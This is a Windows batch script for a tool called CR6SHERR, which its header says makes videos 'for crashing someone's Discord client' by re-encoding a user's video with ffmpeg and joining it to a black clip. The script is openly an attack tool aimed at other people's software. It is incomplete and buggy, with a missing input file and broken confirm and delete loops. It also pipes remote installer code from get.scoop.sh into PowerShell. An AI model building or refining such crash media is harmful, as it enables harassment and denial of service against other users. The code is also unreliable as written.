::  ________/\\\\\\\\\__________________________/\\\\\_______________/\\\___________________________/\\\\\\\\\________/\\\\\\\\\_____        
::   _____/\\\////////_______________________/\\\\////_______________\/\\\_________________________/\\\///////\\\____/\\\///////\\\___       
::    ___/\\\/_____________________________/\\\///____________________\/\\\________________________\/\\\_____\/\\\___\/\\\_____\/\\\___      
::     __/\\\______________/\\/\\\\\\\____/\\\\\\\\\\\_____/\\\\\\\\\\_\/\\\_____________/\\\\\\\\__\/\\\\\\\\\\\/____\/\\\\\\\\\\\/____     
::      _\/\\\_____________\/\\\/////\\\__/\\\\///////\\\__\/\\\//////__\/\\\\\\\\\\____/\\\/////\\\_\/\\\//////\\\____\/\\\//////\\\____    
::       _\//\\\____________\/\\\___\///__\/\\\______\//\\\_\/\\\\\\\\\\_\/\\\/////\\\__/\\\\\\\\\\\__\/\\\____\//\\\___\/\\\____\//\\\___   
::        __\///\\\__________\/\\\_________\//\\\______/\\\__\////////\\\_\/\\\___\/\\\_\//\\///////___\/\\\_____\//\\\__\/\\\_____\//\\\__  
::         ____\////\\\\\\\\\_\/\\\__________\///\\\\\\\\\/____/\\\\\\\\\\_\/\\\___\/\\\__\//\\\\\\\\\\_\/\\\______\//\\\_\/\\\______\//\\\_ 
::          _______\/////////__\///_____________\/////////_____\//////////__\///____\///____\//////////__\///________\///__\///________\///__
::           _________________________________________________________________________________________________________________________________
::            ____________________________________|   mgXzyy#0001   |   github.com/mariangXzyy/CR6SHERR   |____________________________________
::  
::     Simple program that makes videos for crashing someone's Discord client. 
::     Please note that the videos may not crash recent Chromium client versions of Discord because of patch, but it should do its job on 
::     some older versions 
::  
::                          /!\ THE PROGRAM IS NOT COMPLETE, YOU CANNOT MODIFY VIDEOS WITH THIS BATCH SCRIPT YET!!
::  
::  
::  



@echo off
%SystemDrive%

:batchprep
    echo [RUN][ LOG ][ BATCHPREP ]	Preparing for proper program usage...
    title "CR6SHERR // BatchPrep in progress..."
    cd %localappdata% && echo [OK.][ LOG ][ BATCHPREP ]	CD ok.
    if exist mgXzyy\temp\ (
    	echo [OK.][ LOG ][ BATCHPREP ]	Temp folder exists, ok.
    ) else (
	    echo [RUN][ LOG ][ BATCHPREP ]	Preparing temp folder.
	    mkdir mgXzyy
        cd mgXzyy
    	echo [OK.][ LOG ][ BATCHPREP ]	'OK %localappdata%\mgXzyy\
	    
    	mkdir TEMP
	    echo [OK.][ LOG ][ BATCHPREP ]	'OK %localappdata%\mgXzyy\TEMP\
    	echo [OK.][ LOG ][ BATCHPREP ]	Temp folder created, continuing batchprep.
    )
set tempfolder="%localappdata%\mgXzyy\TEMP" && echo [OK.][ LOG ][ BATCHPREP ]	TEMPFOLDER ok.
echo [CHK][ LOG ][ BATCHPREP ]	Checking if ffmpeg is installed (via scoop)...
set ffmpegchk="%userprofile%\scoop\apps\ffmpeg-shared\current\bin"
if exist %ffmpegchk%\ffmpeg.exe (goto batchprep_ffmpegOK)
goto batchprep_ffmpegNULL

:batchprep_ffmpegOK
    echo [OK.][ LOG ][ BATCHPREP ]  FFmpeg was found.
    set ffm=%ffmpegchk%\ffmpeg.exe
    echo [OK.][ LOG ][ BATCHPREP ]  BatchPrep has completed. Log is printed above and not saved as text file.
    timeout /t 2

title "CR6SHERR // Discord Crashing Video Creator // mgXzyy#0001"
echo.

cls
echo.
echo '________/\\\\\\\\\__________________________/\\\\\_______________/\\\___________________________/\\\\\\\\\________/\\\\\\\\\____        
echo ' _____/\\\////////_______________________/\\\\////_______________\/\\\_________________________/\\\///////\\\____/\\\///////\\\___       
echo '  ___/\\\/_____________________________/\\\///____________________\/\\\________________________\/\\\_____\/\\\___\/\\\_____\/\\\___      
echo '   __/\\\______________/\\/\\\\\\\____/\\\\\\\\\\\_____/\\\\\\\\\\_\/\\\_____________/\\\\\\\\__\/\\\\\\\\\\\/____\/\\\\\\\\\\\/____     
echo '    _\/\\\_____________\/\\\/////\\\__/\\\\///////\\\__\/\\\//////__\/\\\\\\\\\\____/\\\/////\\\_\/\\\//////\\\____\/\\\//////\\\____    
echo '     _\//\\\____________\/\\\___\///__\/\\\______\//\\\_\/\\\\\\\\\\_\/\\\/////\\\__/\\\\\\\\\\\__\/\\\____\//\\\___\/\\\____\//\\\___   
echo '      __\///\\\__________\/\\\_________\//\\\______/\\\__\////////\\\_\/\\\___\/\\\_\//\\///////___\/\\\_____\//\\\__\/\\\_____\//\\\__  
echo '       ____\////\\\\\\\\\_\/\\\__________\///\\\\\\\\\/____/\\\\\\\\\\_\/\\\___\/\\\__\//\\\\\\\\\\_\/\\\______\//\\\_\/\\\______\//\\\_ 
echo '        _______\/////////__\///_____________\/////////_____\//////////__\///____\///____\//////////__\///________\///__\///________\///__
echo '         _________________________________________________________________________________________________________________________________
echo '          ________________________/   Version 0.7   /   mgXzyy#0001   \   github.com/mariangXzyy/CR6SHERR   \______________________________
echo.

:cr6sherr_setup
:: Program will request the full path of the video.
set /p videopath="[ INPUT ] Enter the video file path > "
:: Program will request a name for the output video.
set /p crashername="[ OUTPUT ] Enter the crasher name > "
:: Program will ask for a file type of the video.
echo [ CR6SHERR ] What file type do you want the crasher video to be?
:cr6sherr_ftsel

echo " 1 >>  WebM                                                       "
echo " 2 >>  MPEG4                                                      "
echo " 3 >>  Quicktime MOV                                              "
echo " 4 >>  Matroska MKV                                               "
echo " 5 >>  Gif (soon)                                                 "

set /p crasherft="Input > "

:: Program will check the user input and sets the ft variable (ft meaning filetype or extension)
if %crasherft%==1 (set ft=webm && goto cr6sherr_confirm)
if %crasherft%==2 (set ft=mp4 && goto cr6sherr_confirm)
if %crasherft%==3 (set ft=mov && goto cr6sherr_confirm)
if %crasherft%==4 (set ft=mkv && goto cr6sherr_confirm)
if %crasherft%==5 (
    echo [ CR6SHERR ] GIF is not supported yet?
    goto cr6sherr_ftsel
)
:: If it is not a valid option, the program will ask again for the filetype of the video.
    echo [ CR6SHER ]    Invalid option. input a valid option
    goto cr6sherr_ftsel

:cr6sherr_confirm
:: Program will ask for user to confirm the actions.
    echo [ CR6SHER ]    Are you sure you want to continue with the actions below?
    echo    Input Video Path:      %videopath%
    echo    Output Crashing Video: %crashername%.%ft%
    set /p confirmaction="(y/n) > "
    echo.
    if %confirmaction%==y (echo [OK.][ LOG ][ CR6SHERR ]    Proceeding.)
    if %confirmaction%==n (goto cr6sherr_setup)
:: Invalid option again?
    echo [ CR6SHER ]    Invalid option, type Y for yes or N for no.
    goto cr6sherr_process

:cr6sherr_process
:: Program will check if the video is a vaild one.
    echo [CHK][ LOG ][ PREPARATION ]	Checking if video given is valid...
    :: there will be the code for checking validity
    echo [OK.][ LOG ][ PREPARATION ]	Video given is valid.
    echo [RUN][ LOG ][ PROGRESS ]	Running ffmpeg...
    %ffm% -i '%videopath%' -pix_fmt yuv444p %tempfolder%\video.webm
    (
    echo file %tempfolder%\video.webm
    echo file %tempfolder%\black.webm
    )>"%tempfolder%\ffmpeg.txt"
    %ffm% -f concat -i %tempfolder%\ffmpeg.txt -codec copy "%userprofile%\Downloads\%crashername%.webm"
    del "%tempfolder%\ffmpeg.txt"
    del "%tempfolder%\video.webm"
    if not %ft%=="webm" (ren "%userprofile%\Downloads\%crashername%.webm" "%crashername%.%ft%")
    echo [OK.][ LOG ][ CR6SHER ]    Success. Saved as "%userprofile%\Downloads\%crashername%.%ft%"
    echo.
    set /p confDel="[ CR6SHER ] Do you want to delete the original video? (y/n) > "
    :confDelRepeat
    if %confDel%==y (del %videopath%)
    if %confDel%==n (echo.)
    echo [ CR6SHERR ]   Invalid option, type Y for yes or N for no.
    set /p confDel="(y/n) > "
    goto confDelRepeat

    


:batchprep_ffmpegNULL
	echo [ERR][ LOG ][ BATCHPREP ]	FFMPEG-SHARED IS NOT INSTALLED.
	set /p confFFMPEGinst="[ Input ] Download FFmpeg? You will need Scoop installed(if not, type S) (y/n/s) > "
    if %confFFMPEGinst%==y (goto batchprep_ffmpegpull)
    if %confFFMPEGinst%==n (goto batchprep_fail)
    if %confFFMPEGinst%==s (goto batchprep_scoop)
    echo [ERR][ LOG ][ CR6SHERR ]   Invalid input. Type Y to install FFmpeg with Scoop, N to cancel or S to install Scoop for downloading FFmpeg.
    goto batchprep_ffmpegNULL

:batchprep_ffmpegpull
    scoop install ffmpeg-shared
    echo [OK.][ LOG ][ BATCHPREP ]  FFmpeg should be downloaded at %userprofile%\scoop\apps\ffmpeg-shared\current\bin, checking...
    echo                            If it has not been installed, Scoop installation will start.
    set ffmpegchk="%userprofile%\scoop\apps\ffmpeg-shared\current\bin"
    if exist %ffmpegchk%\ffmpeg.exe (goto batchprep_ffmpegOK)
    echo [ERR][ LOG ][ BATCHPREP ]  FFmpeg not downloaded properly. CR6SHER will attempt Scoop installation
    echo.
    echo.
    
:batchprep_scoop

    net session >nul 2>&1
    if %errorLevel% == 0 (
        powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; iex '& {$(irm get.scoop.sh)} -RunAsAdmin'"
    ) else (
        powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; irm get.scoop.sh | iex"
    )
    echo [OK.][ LOG ][ BATCHPREP ]  Scoop was installed for ffmpeg-shared installation.
    echo                            You will have to run CR6SHERR again. This terminal process will be closed in 10s.
    timeout /t 10
    exit

:batchprep_fail
    echo.
    echo [ERR][ LOG ][ CR6SHERR ]   Batchprep failed. Log is printed above and not saved as text file.
    echo                            If you get the same errors again and again, do not hesitate to open
    echo                            an issue on https://github.com/mariangXzyy/CR6SHERR/issues.
    echo.
    pause && goto exit

:fail
    echo.
    echo [ERR][ LOG ][ CR6SHERR ]   An error has occurred. Log is printed above and not saved as text file.
    echo                            If you get the same errors again and again, do not hesitate to open
    echo                            an issue on https://github.com/mariangXzyy/CR6SHERR/issues.
    echo.
    pause && goto exit

:exit
